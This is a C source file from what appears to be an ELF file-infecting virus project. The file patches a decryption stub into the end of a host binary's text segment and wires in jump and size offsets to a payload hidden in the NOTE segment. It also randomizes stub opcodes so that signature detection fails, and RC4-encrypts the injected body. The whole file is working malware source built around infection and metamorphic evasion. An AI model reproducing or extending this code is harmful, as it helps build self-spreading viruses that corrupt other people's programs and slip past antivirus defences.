#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline void insert_stub(char *dst, Elf64_Phdr **segment)
{
	char *stub = (char *)L1;

	const size_t patch_address = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - (STUB_SIZE - (ADDR_OFFSET + JUMP_SIZE)));
	const size_t patch_size = ((void *)__exit - (void *)__entry) + FCNT_SIZE;
	const size_t patch_jump = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz));

	const size_t size = sizeof(int);

	_memcpy(stub + ADDR_OFFSET, &patch_address, size); 
	_memcpy(stub + SIZE_OFFSET, &patch_size, size);
	_memcpy(stub + (STUB_SIZE - JUMP_SIZE), &patch_jump, size);

	_memcpy(dst + ((segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - STUB_SIZE), stub, STUB_SIZE);
}

__attribute__((always_inline)) static inline void metamorph_stub(void)
{
	const struct s_metamorph metamorph =
	{
		{RBP, RSP, RBX, RAX, RDI, RSI, RDX, RCX},
		{OFFSET_1, OFFSET_2, OFFSET_3, OFFSET_4, OFFSET_5, OFFSET_6, OFFSET_7, OFFSET_8, OFFSET_9, OFFSET_A},
	};

	char *stub;
	unsigned short opcode;
	
	stub = (char *)L1;

	for (register size_t index = 0; index < OFFS_SIZE; index++)
	{
		opcode = metamorph.code[_get_random_integer(CODE_SIZE)];

		_memcpy(stub + metamorph.offset[index], &opcode, sizeof(unsigned short));
	}
}


////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void stub(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection)
{

#if LOGGER
	MID_LOGGER("stub:\t\t\t");
#endif

	if (context == FAILURE)
		goto label;

	const unsigned char key[] = "********";

	metamorph_stub();
	insert_stub(injection->ptr, host->segment);

	RC4(key, DEFAULT_KEY_SIZE, injection->ptr + host->segment[NOTE]->p_offset, ((void *)__exit - (void *)__entry) + FCNT_SIZE);

label:
	clean(host, keychain, context, injection);
}
